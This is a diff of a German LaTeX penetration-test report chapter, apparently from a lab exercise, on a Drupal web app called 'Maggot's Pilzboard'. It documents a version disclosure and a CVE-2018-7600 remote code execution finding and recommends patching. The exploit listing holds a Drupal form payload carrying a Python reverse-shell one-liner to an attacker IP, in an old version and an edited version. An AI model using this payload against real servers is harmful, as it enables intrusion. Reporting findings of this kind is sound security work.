@@ -1,19 +1,21 @@
 \pagebreak
 \chapter{Maggot's Pilzboard}
 
+\vfill
 \begin{figure}[!ht]
     \centering
     \includegraphics[width=\linewidth]{images/screenshots/07_pilzboard.png}
     \caption{Webanwendung Maggot's Pilzboard}
     \label{fig:05_pilzboard}
 \end{figure}
+\vfill
 \newpage
 
 \cvss{av=local, ac=high, pr=high, ui=required, s=unchanged, c=low, i=low, a=low}
-\cvssdescription{Etiam risus sapien, ornare at dui ut, semper eleifend arcu. In fermentum felis ut ornare convallis. Donec ultrices condimentum neque ut semper.}
+\cvssdescription{Informationsfreigabe über das verwendete CMS System inklusive Versionsnummer über den Footer der Anwendung.}
 
-\section{\makecvssbadge Maggot's Pilzboard: Informationsfreigabe}
-\cvssaddtosummary{Maggot's Pilzboard: Informationsfreigabe}
+\section{\makecvssbadge Information Disclosure}
+\cvssaddtosummary{Maggot's Pilzboard: Information Disclosure}
 
 \subsection*{Proof of concept}
 Über den Footer der Anwendung kann herausgefunden werden, dass es sich um eine Drupal Webanwendung handelt. Die Webanwendung verwendet Drupal in der Version 8, welche eine veraltete Versionen ist und Sicherheitslücken aufweist.
@@ -23,11 +25,11 @@
 \cvss{av=network, ac=low, pr=none, ui=required, s=changed, c=high, i=high, a=high}
 \cvssdescription{Eine bekannte Sicherheitslücke in Drupal führt zu einer Remote Code Execution auf dem Webserver.}
 
-\section{\makecvssbadge Maggot's Pilzboard: Remote Code Execution}
+\section{\makecvssbadge Remote Code Execution}
 \cvssaddtosummary{Maggot's Pilzboard: Remote Code Execution}
 
 \subsection*{Proof of concept}
-Über einen bekannten Exploit mit der CVE Nummer CVE-2018-7600 kann Code auf dem kompromitiertem Drupal System ausgeführt werden. Dies ermöglicht es direkt eine Reverse Shell zu dem System herstellen zu können. Der HTTP Request des Exploits kann mit einem Tool wie der Burpsuite intercepted und die Payload angepasst werden. Die Playoad zum Starten einer Reverse Shell ist in folgendem Listing aufgeführt. Ein Beweisscreenshot ist in \autoref{fig:05_pilzboard_proof} abgegbildet.
+Ein bekannter Exploit mit der CVE-Nummer CVE-2018-7600 erlaubt die Ausführung von Code auf einem Drupal-System. Dadurch kann direkt eine Reverse Shell auf dem System erstellt werden. Der Python Code für diesen Exploit ist in \autoref{listing:appendix:pilzboard_RCE} gelistet. Der HTTP-Request des Exploits kann mit einem Tool wie Burpsuite abgefangen und die Payload angepasst werden. Die Playoad zum Starten einer Reverse Shell ist in \autoref{listing:pilzboard:reverseshell} aufgeführt. Ein Nachweis ist in \autoref{fig:05_pilzboard_proof} dargestellt.
 
 
 \begin{listing}[!ht]
@@ -35,7 +37,7 @@
 POST /routers/cancel-order.php HTTP/1.1 
 Host: 10.0.68.122
 [...]
-'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket. SOCK_STREAM)%3bs.connect(("10.0.32.5",9001))%3bos.dup2(s.fileno(),0)%3b+os.dup2( s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b''
+'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket. SOCK_STREAM)%3bs.connect(("<Angreifer-IP>",9001))%3bos.dup2(s.fileno(),0)%3b+os.dup2( s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b''
 \end{minted}
 \caption{Reverse Shell}
 \label{listing:pilzboard:reverseshell}
@@ -49,6 +51,6 @@ Host: 10.0.68.122
 
 \subsection*{Empfehlungen}
 \begin{itemize}
-    \item Drupal-Aktualisieren: Die Drupal-Version sollte unbedingt auf eine Version aktualisiert werden, welche den Patch für diese Sicherheitslücke beinhaltet.
-    \item Regelmäßige Sicherheitsupdates: Sie sollten regelmäßig prüfen, ob es für die verwendeten Systeme Sicherheitsupdates gibt und wenn ja sollten diese zeitnah installiert werden, um ähnliche vorfälle zu verhindern.
+    \item Drupal-Aktualisieren: Die Drupal-Version sollte unbedingt auf eine Version aktualisiert werden, welche den Patch für diese Sicherheitslücke beinhaltet (siehe \cite{owaspVulnerableDependency}).
+    \item Regelmäßige Sicherheitsupdates: Sie sollten regelmäßig prüfen, ob es für die verwendeten Systeme Sicherheitsupdates gibt und wenn ja sollten diese zeitnah installiert werden, um ähnliche vorfälle zu verhindern (siehe \cite{owaspVulnerableDependency}).
 \end{itemize}
